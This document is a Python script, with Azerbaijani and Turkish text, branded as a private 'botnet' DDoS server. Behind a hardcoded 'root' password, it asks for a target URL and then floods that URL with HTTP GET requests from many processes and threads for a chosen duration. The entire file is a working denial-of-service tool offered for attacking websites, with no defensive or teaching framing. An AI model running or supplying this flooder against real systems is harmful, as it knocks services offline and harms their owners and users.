import threading
import time
import multiprocessing
import requests
from colorama import Fore, Style
import os
import sys

# İskopisix bannerini animasiya ilə göstərmək
def display_banner():
    banner_text = "0100010001001001111001001111001010 666 ISKOPISIX BOTNET SERVER PRIVATE DDOS SERVER 0100010100010111001001001000101111010"

    os.system("cls" if os.name == "nt" else "clear")  # Terminalı təmizlə
    for char in banner_text:
        sys.stdout.write(Fore.GREEN + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.1)  # Hər hərfi müəyyən gecikmə ilə göstər
    print("\n")

def password_prompt():
    password = input("Parol daxil edin: ")
    if password == "root":
        print(Fore.GREEN + "Düzgün parol! 0x7F6AD9F14371C6FB9678CA77 hücum menusu açılır..." + Style.RESET_ALL)
        start_attack()  # Hücum menyusu
    else:
        print(Fore.RED + "Yanlış parol! Çıxış edilir..." + Style.RESET_ALL)
        exit(0)

# Bir çekirdek üzerinde daha fazla iş parçacığı ile saldırıyı hızlandırma
def send_requests_threaded(target, request_count, thread_count):
    def send_request_thread():
        for _ in range(request_count):  # Her iş parçacığı belirlenen sayıda istek yapacak
            try:
                response = requests.get(target)
                print(f"Status Code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Hata: {e}")

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def show_attack_animation():
    animation_text = "Hücum başlayır... "
    for _ in range(5):  # 5 saniyə animasiya
        for char in animation_text:
            sys.stdout.write(Fore.YELLOW + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.2)  # Hər hərfi müəyyən gecikmə ilə göstər
        sys.stdout.write('\r')  # Xətanı sil
        sys.stdout.flush()
        time.sleep(0.5)  # Bir az gözləyin

def start_attack():
    try:
        target = input("Hedef URL: ")
        request_count = int(input("Gönderilecek İstek Sayısı: "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))
        thread_count = int(input("İş Parçacığı Sayısı (thread) her çekirdek için: "))
        attack_duration = int(input("Saldırı Süresi (saniye): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        # Saldırı gücüne göre iş parçacığı sayısını artır
        thread_count = thread_count * attack_power

        print(f"{request_count} adet istek {target} adresine {cores_to_use} çekirdek ve her çekirdek için {thread_count} iş parçacığı kullanılarak gönderiliyor...")

        # Hücum animasiyasını göstər
        show_attack_animation()

        start_time = time.time()
        processes = []

        while time.time() - start_time < attack_duration:  # Saldırı süresi boyunca devam et
            for i in range(cores_to_use):
                process = multiprocessing.Process(target=send_requests_threaded, args=(target, request_count, thread_count))
                processes.append(process)
                process.start()

            for process in processes:
                process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam süre: {duration:.2f} saniye.")
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def main():
    try:
        display_banner()  # Banner yazısı göstərilir
        password_prompt()  # Parol sorğusu göstərilir
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()
